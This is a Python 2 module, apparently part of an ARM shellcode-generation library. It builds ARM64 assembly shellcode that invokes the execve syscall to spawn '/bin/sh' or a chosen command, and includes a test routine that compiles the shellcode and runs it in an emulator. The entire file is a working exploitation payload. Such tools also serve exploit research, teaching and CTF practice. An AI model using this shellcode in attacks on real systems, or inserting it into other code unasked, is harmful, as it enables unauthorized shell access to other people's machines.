def generate(cmd='/bin/sh'):
    """Executes cmd

    Args:
        cmd(str): executes cmd (default: ``/bin/sh``)
    """
    sc = """
    adr  x0, bin_sh_1
    mov  x2, 0
    str  x0, [sp, 0]
    str  x2, [sp, 8]
    mov  x1, sp
    mov  x8, 221
    svc  0
bin_sh_1:
    .asciz "%s\x00"
    """ % (cmd)
    return sc

def testcase(cmd='/bin/sh'):
    import ARMSCGen as scgen
    scgen.prepareCompiler('ARM64')
    sc = scgen.CompileSC(generate(cmd), isThumb=False)
    sclen = sc.find(cmd)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM64, scgen.UC_MODE_ARM, not False)

if __name__ == '__main__':
    print generate()
